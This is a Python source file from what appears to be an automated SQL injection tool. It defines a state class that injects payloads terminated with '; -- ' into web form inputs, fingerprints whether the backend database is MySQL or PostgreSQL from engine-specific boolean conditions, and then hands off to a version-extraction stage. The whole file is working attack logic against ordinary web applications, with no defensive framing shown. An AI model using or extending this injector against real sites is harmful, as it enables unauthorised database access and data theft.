import logging

from src.engines.sql_injection_mysql import SQLInjectionEngineMySQL
from src.engines.sql_injection_postgres import SQLInjectionEnginePostgreSQL
from src.injector_state.sql_injector_state import SQLInjectorState
from src.injector_state.sql_injector_version_state import SQLInjectorGetVersionState
from src.sql_injection_builder import SQLInjectionBuilder
from src.scraping.parse_sql_response_from_html import parse_sql_response_from_html
 
class SQLInjectorDatabaseEngineState(SQLInjectorState):
    def __init__(self, sql_injector) -> None:
        super().__init__(sql_injector)
        self.engine = None

    def next(self):
        if self.engine == "mysql":
            self.sql_injector.state = SQLInjectorGetVersionState(self.sql_injector, SQLInjectionEngineMySQL())
        elif self.engine == "postgres":
            self.sql_injector.state = SQLInjectorGetVersionState(self.sql_injector, SQLInjectionEnginePostgreSQL())
        else:
            raise NotImplementedError(f"{self.engine} - Engine not implemented")
        return self.sql_injector.state

    def inject(self, action, input_chosen, inputs):
        for key in SQLInjectorState.injections_to_try:
            response = super().injection(action, input_chosen, inputs, key + "; -- ")
            if response is not None:
                engine = self.get_database_engine(action, input_chosen, inputs, key)
                if engine is not None:
                    logging.info(f"\033[0;36mDatabase Engine: {engine}\033[0m")
                    self.engine = engine
                    self.next().inject(action, input_chosen, inputs)
                    return True
        return False

    def get_database_engine(self, action, input_chosen, inputs, previous_str):
        str_mysql = SQLInjectionBuilder().add_str(previous_str).and_condition(SQLInjectionEngineMySQL.identify()).build()
        str_postgres = SQLInjectionBuilder().add_str(previous_str).and_condition(SQLInjectionEnginePostgreSQL.identify()).build()
        response_mysql =  super().injection(action, input_chosen, inputs, str_mysql)
        response_postgres =  super().injection(action, input_chosen, inputs, str_postgres)
        if response_mysql and not response_postgres:
            return "mysql"
        elif not response_mysql and  response_postgres:
            return "postgres"
        else:
            return None
        